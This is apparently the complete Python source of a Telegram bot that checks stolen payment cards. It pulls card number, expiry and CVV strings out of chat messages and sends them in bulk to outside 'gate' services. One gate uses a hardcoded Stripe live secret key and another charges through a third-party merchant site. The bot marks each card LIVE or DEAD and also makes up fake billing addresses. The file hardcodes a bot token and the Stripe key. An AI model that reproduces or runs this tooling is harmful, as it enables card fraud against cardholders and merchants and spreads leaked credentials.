import telebot
import httpx
import re
import random
import time
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8318488317:AAGqEa9WwLVRo57U66mpMTTOqUQRSBDZEeE" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=25)

# --- ACCURATE ADDRESS DATA ---
NAMES = {
    "USA": {"fn": ["James", "Robert", "Patricia"], "ln": ["Smith", "Williams", "Brown"], "st": "NY", "zip": "10001", "flag": "🇺🇸"},
    "UK": {"fn": ["Oliver", "George", "Isla"], "ln": ["Taylor", "Davies", "Evans"], "st": "ENG", "zip": "E1 6AN", "flag": "🇬🇧"},
    "IN": {"fn": ["Arjun", "Aarav", "Ananya"], "ln": ["Sharma", "Patel", "Verma"], "st": "MH", "zip": "400001", "flag": "🇮🇳"},
    "DE": {"fn": ["Lukas", "Leon", "Mia"], "ln": ["Müller", "Schmidt", "Weber"], "st": "BE", "zip": "10115", "flag": "🇩🇪"}
}

def generate_address(code):
    n = NAMES[code]
    fn, ln = random.choice(n["fn"]), random.choice(n["ln"])
    return (f"{n['flag']} <b>{code} ACCURATE ADDR</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
            f"🏠 <b>Street:</b> <code>{random.randint(10, 400)} Park Lane</code>\n"
            f"🏙 <b>City:</b> {n['st']}\n"
            f"📮 <b>Zip:</b> <code>{n['zip']}</code>\n"
            f"━━━━━━━━━━━━━━")

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("💳 Check Card", "🏠 Address Gen")
    return markup

def gate_menu(cc, mode="single"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    # Mode is passed in callback to handle mass vs single logic
    markup.add(
        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{mode}|{cc}"),
        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{mode}|{cc}"),
        types.InlineKeyboardButton("🚀 BOTH GATES", callback_data=f"gt|both|{mode}|{cc}")
    )
    return markup

# --- API CORE ---
def call_api(gate, full_cc):
    try:
        # Strict formatting to avoid "Invalid Format" errors
        full_cc = full_cc.strip().replace(" ", "")
        if gate == "sk":
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={full_cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={full_cc}"
        
        with httpx.Client(timeout=30.0) as client:
            res = client.get(url).text.strip()
            low = res.lower()
            if any(x in low for x in ["success", "approved", "cvv live", "charged"]):
                return f"✅ <b>LIVE:</b> <code>{res[:70]}</code>"
            return f"❌ <b>DEAD:</b> <code>{res[:70]}</code>"
    except:
        return "⚠️ <b>TIMEOUT/OFFLINE</b>"

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "<b>💎 V1 PROFESSIONAL</b>\nMass & Single checking active.", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def addr(message):
    markup = types.InlineKeyboardMarkup()
    btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in NAMES.items()]
    markup.add(*btns)
    bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def filter_cards(message):
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if not cards: return
    
    if len(cards) == 1:
        bot.reply_to(message, f"💳 <b>Single Card:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0], "single"))
    else:
        # Join cards with a comma for the callback data (limit to 10 for button safety)
        cc_list = ",".join(cards[:10])
        bot.reply_to(message, f"📂 <b>Mass Pack:</b> {len(cards)} cards detected.", reply_markup=gate_menu(cc_list, "mass"))

@bot.callback_query_handler(func=lambda call: True)
def handle_clicks(call):
    # Format: gt | gate | mode | cc_data
    p = call.data.split("|")
    
    if p[0] == "adr":
        bot.edit_message_text(generate_address(p[1]), call.message.chat.id, call.message.message_id)
        
    elif p[0] == "gt":
        gate, mode, data = p[1], p[2], p[3]
        cc_items = data.split(",")
        
        bot.edit_message_text(f"⏳ <b>Processing {mode.upper()}...</b>", call.message.chat.id, call.message.message_id)
        
        results = []
        # Multi-threading for speed
        if gate == "both":
            for cc in cc_items:
                f1, f2 = executor.submit(call_api, "sk", cc), executor.submit(call_api, "as", cc)
                results.append(f"💳 <code>{cc}</code>\n1️⃣ {f1.result()}\n2️⃣ {f2.result()}")
        else:
            futures = {executor.submit(call_api, gate, cc): cc for cc in cc_items}
            for f in futures:
                results.append(f"💳 <code>{futures[f]}</code>\n┗ {f.result()}")
        
        final_txt = "<b>🏁 Results:</b>\n" + "\n\n".join(results)
        # Handle long messages by splitting
        if len(final_txt) > 4000: final_txt = final_txt[:4000] + "\n...(truncated)"
        bot.edit_message_text(final_txt, call.message.chat.id, call.message.message_id)

bot.infinity_polling()
